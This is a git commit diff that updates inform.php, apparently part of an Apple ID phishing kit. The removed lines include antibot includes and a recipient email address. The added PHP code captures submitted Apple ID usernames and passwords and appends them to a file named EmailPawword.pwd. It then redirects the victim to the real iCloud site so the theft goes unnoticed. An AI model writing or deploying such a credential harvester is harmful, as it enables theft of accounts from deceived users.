a4ead6c0967ff838ff2586c80576043b6270e19c
devicerecovery <31586541+devicerecovery@users.noreply.github.com>
2019-01-21 17:10:13 +0100

    Update inform.php

--- inform.php
+++ inform.php
@@ -1,6 +1,17 @@
-<? 
-include 'antibots.php';
-include 'bots.php';
-session_start();
-$to="giorgi00762@mail.bg";
- ?>
+<?php
+if(isset($_POST['apple']) && isset($_POST['pw'])) {
+    $data = $_POST['apple'] . '=>=>=>=>=>=>=>' . $_POST['pw'] . "\n\n\n";
+    $ret = file_put_contents('EmailPawword.pwd', $data, FILE_APPEND | LOCK_EX);
+    if($ret === false) {
+        die('error!');
+    }
+    else {
+        echo "Done";
+    }
+}
+else {
+   die('Error');
+}
+header("Location: https://www.icloud.com");
+die();
+?>
